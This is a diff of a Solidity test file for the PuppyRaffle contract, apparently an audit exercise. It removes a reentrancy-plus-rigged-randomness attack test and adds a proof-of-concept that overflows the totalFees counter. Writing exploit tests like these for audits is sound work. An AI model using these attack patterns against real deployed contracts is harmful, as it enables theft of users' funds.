@@ -5,7 +5,7 @@ pragma experimental ABIEncoderV2;
 import {Test, console, Vm} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 import {ReentrancyContract} from "./ReentrancyContract.sol";
-import {ReentrancyRandomnessChain} from "./ReentrancyAndRandomnessChain.sol";
+
 
 
 contract PuppyRaffleTest is Test {
@@ -223,48 +223,51 @@ contract PuppyRaffleTest is Test {
     /// EXPLOITS       ///
     /////////////////////
 
-    function testReentrancyRandomnesChain() public {
-        // Stage 0: Start to record logs and start raffle than wait to raffle end
-        // That imitates malicious user who monitors the logs and tries to exploit the system
-        vm.recordLogs();
-        // Users enter the raffle
-        address[] memory players1 = new address[](3);
-        players1[0] = playerOne;
-        players1[1] = playerTwo;
-        players1[2] = playerThree;
+    function testOverflowSelecWinner() public {
+        // Overflow in totalFees = totalFees + uint64(fee); 
+        // We will enter 19 players and then enter one more to cause overflow
+        uint256 numAccounts = 19;
         
-        puppyRaffle.enterRaffle{value: entranceFee * 3}(players1);
+        uint totalFees = puppyRaffle.totalFees();
+        uint deposited = 0;
+        
+        for (uint256 i = 0; i < numAccounts; i++) {
+            address account = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
+            vm.deal(account, entranceFee);
 
-        address[] memory players2 = new address[](2);
-        players2[0] = playerFour;
-        players2[1] = address(5);
-        puppyRaffle.enterRaffle{value: entranceFee * 2}(players2);
-
-        // DEBUG: check logs
-
-        // Raffle ends
+            address[] memory players1 = new address[](1);
+            players1[0] = account;
+            // Assuming there's a function to enter the raffle
+            puppyRaffle.enterRaffle{value: entranceFee}(players1);
+            deposited += entranceFee;
+        }
+        // Next player will cause overflow. 
+        // Check current state
+        address account = address(uint160(uint256(keccak256(abi.encodePacked('31337')))));
+        vm.deal(account, entranceFee);
+         address[] memory overflow = new address[](1);
+        // Enter and cause overflow 
+        puppyRaffle.enterRaffle{value: entranceFee}(overflow);
+        deposited += entranceFee;
+        // Fastforward time to end the raffle
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
-        
-        // Attacker generates address that he controlls and will always win Legendary item
-        // From here he operates from that address. After refound array size will be the same.
-        address legendaryAddress = findLegendaryAddress();
 
-        // Retrieve the recorded logs and current players
-        Vm.Log[] memory logs = vm.getRecordedLogs();
-        uint256 playerCount = getPlayerCount( logs );
-        console.log("Player count: ", playerCount);
-        uint attackerIndex = playerCount; 
+        // Run selectWinner to update the totalFees
+        vm.prank(account);
+        puppyRaffle.selectWinner();
 
-        // Deploy malisous contract when raffle ends. Legendary address will be the one who will call select winner. 
-        uint numberOfMalicousPlayers = 500;
-        uint attackFunds = entranceFee * numberOfMalicousPlayers;
-        vm.deal(legendaryAddress, attackFunds);
-        vm.startPrank(legendaryAddress);
-        ReentrancyRandomnessChain reentrancyContract = new ReentrancyRandomnessChain{value: attackFunds-1 }(address(puppyRaffle), legendaryAddress,playerCount);
+        // Check if overflow happened
+        uint64 newFees = puppyRaffle.totalFees();
+        assertLt(uint(newFees), deposited, "Overflow did not happen");
+    }
 
-        reentrancyContract.attack();
-
+    function testRafflePayable() public {
+        address sender = makeAddr("sender");
+        vm.deal(sender, 1 ether);
+        vm.expectRevert();
+        (bool succ, ) = payable(address(puppyRaffle) ).call{value: 1 ether}("");
+        require(succ);
     }
 
     function testRandonNumberSelectWinner() public {
